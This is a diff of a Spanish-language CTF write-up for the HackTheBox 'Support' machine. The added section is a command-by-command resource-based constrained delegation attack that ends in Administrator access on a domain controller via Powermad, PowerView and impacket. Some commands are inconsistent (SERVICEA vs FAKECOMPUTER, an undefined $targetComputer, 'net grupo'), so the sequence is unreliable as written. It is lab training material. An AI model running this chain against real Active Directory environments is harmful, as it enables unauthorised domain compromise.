@@ -6,9 +6,10 @@ header:
 categories:
   - Blog
 ---
-## AD
+## Que es AD?
 
 En primer lugar, **AD (Active Directory) es una tecnología diseñada por Microsoft** e introducida en Windows 2000 Server  cuyo objetivo es el de definir un conjunto de **componentes centralizados** que se encargan de **almacenar, organizar y distribuir información a las máquinas que hacen parte de una red de ordenadores**. Para que exista un AD, es necesario contar con ordenadores que tengan una versión «Server» de Windows, los cuales se encargarán precisamente de mantener la información del entorno. Ahora bien, la información que se guarda en estos servidores se compone de unidades llamadas objetos y pueden ser prácticamente cualquier cosa: Usuarios, ordenadores, grupos, unidades organizativas, servicios, etc.
+
 ## Fase de reconocimiento 
 
 Verificaremos si la maquina esta encendida y tenemos conexión con ella.
@@ -18,18 +19,7 @@ ping -c 1 10.10.11.174
 ```
 
 Sabemos que es Windows por tu TTL -> 128 (Windows) - 64 (Linux)
-En HackTheBox podemos meterle un treiroot
-
-```
-ping -c 1 10.10.11.174 -R
-```
-
-podemos ver si existe algo intermediario
-
 Empezaremos metiéndole un nmap para poder hacer un reconocimiento de sus puertos y los servicios que están corriendo por el mismo. 
-
-65.535
-
 
 ```
 nmap -p- --open -sS -sCV --min-rate 5000 10.10.11.174 -oN info_basic
@@ -64,7 +54,7 @@ Para los que no sepan el /etc/hosts básicamente, permite a un sistema resolver 
 
 Ahora ya nos debería resolver los dominios contemplados.
 
-### Fase de explotación
+## Fase de explotación
 
 Nos conectaremos al servicio smb usando la null session encontrada para poder descargarnos los archivos para saber si existe algo interesante.
 
@@ -192,5 +182,149 @@ evil-winrm -u support -p 'Ironside47pleasure40Watchful' -i support.htb
 
 nos conectamos y podemos ver la flag del usuario.
 
+## Escalada de Privilegios.
+
+Para empezar la escalada, podemos realizar otra ves un par de revisiones para saber por donde podríamos efectuarla. 
+
+por lo cual metemos:
+
+```
+whoami /priv
+```
+
+NADA..
+
+```
+net user support
+```
+
+```
+net grupo
+```
+
+y observamos que tenemos un parámetro peculiar el 
+
+```
+Local Group Memberships      *Remote Management Use
+```
+
+Ahora que estamos dentro, podemos intentar usar Bloodhound para una mayor enumeración. Bloodhound nos hace la vida más fácil porque puede brindarnos visualización de las relaciones dentro de un entorno de Active Directory.
+
+![[1_5spMDuzsTbmZcPKNP_aijw.webp]]
+
+Este grafico puede ser un poco confuso para aquellos que no han topado AD, pero debeemos saber que:
+
+Como somos usuarios de soport, estamos dentro de CUENTA DE SOPORTE COMPARTIDO@support.htb. También podemos verlo ejecutando el soporte Get-ADPrincipalGroupMembership en Powershell.
+
+```
+Get-ADPrincipalGroupMembership support
+```
+
+con esto vemos el parametro `distinguishedName : CN=Shared Support Accounts,CN=Users,DC=support,DC=htb` y esto nos dice que obtuvimos el permiso GenericAll para el controlador de dominio dc.support.htb, lo que significa que tenemos todos los derechos sobre el objeto dc.support.htb.
+
+Entonces lo que efectuaremos ahora es un Resource-based Constrained Delegation attack.
+
+Fuera de lo que estamos haciendo por explicar un poco el concepto de esto:
+
+En el protocolo Kerberos, la delegación restringida permite que un servicio, por ejemplo, un servidor web, actúe en nombre de un usuario para acceder a recursos en otro servidor en su nombre, sin necesidad de que el usuario proporcione sus credenciales. .
+
+Sin embargo, un ataque de delegación restringida basada en recursos ocurre cuando un atacante explota una configuración insegura en un sistema que permite la delegación de credenciales a un recurso específico, como una base de datos o un servidor de archivos. El atacante aprovecha esta debilidad para obtener acceso no autorizado a otros recursos dentro del sistema o la red, comprometiendo así la seguridad de la infraestructura.
+
+Nos apoyaremos en hacktricks para hacer esto:
+
+```
+https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/resource-based-constrained-delegation
+```
+
+entonces lo primero es instalar y obtener lo que necesitamos, por un lado Powermad y Powerview.
+
+Descargamos el RAW del Powermad en nuestro equipo:
+
+```
+wget https://raw.githubusercontent.com/Kevin-Robertson/Powermad/master/Powermad.ps1
+```
+
+Agregamos a la maquina victima el Powermad
+
+```
+upload  /Powermad.ps1
+```
+
+Lo vamos a ejecutar
+
+```
+Import-Module .\Powermad.ps1
+```
+
+vamos a usar el Powerview para enumerar la parte del AD:
+
+```
+https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1
+```
+
+lo traremos a la maquina nuestra:
+
+```
+wget https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1
+```
+
+y  lo cargaremos en la maquina Windows:
+
+```
+upload /PowerView.ps1
+```
+
+finalmente lo vamos a ejecutar:
+
+```
+Import-Module .\PowerView.ps1
+```
+
+y vamos a empezar con el proceso, los proximos comandos simplemente se ejecutan desde a maquina victima:
+
+```
+New-MachineAccount -MachineAccount SERVICEA -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
+```
+
+```
+Get-DomainComputer SERVICEA
+```
+
+```
+$ComputerSid = Get-DomainComputer FAKECOMPUTER -Properties objectsid | Select -Expand objectsid
+```
+
+```
+$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$ComputerSid)"
+```
+
+```
+$SDBytes = New-Object byte[] ($SD.BinaryLength)
+```
+
+```
+$SD.GetBinaryForm($SDBytes, 0)
+```
+
+```
+Get-DomainComputer $targetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}
+```
+
+```
+Get-DomainComputer $targetComputer -Properties 'msds-allowedtoactonbehalfofotheridentity'
+```
+
+```
+impacket-getST -spn cifs/dc.support.htb -impersonate Administrator -dc-ip 10.10.11.174 support.htb/SERVICEA$:123456
+```
+
+```
+export KRB5CCNAME=Administrator.ccache
+```
+
+```
+impacket-psexec -k dc.support.htb
+```
+y wuala... seremos usuarios Administrator.
 
 
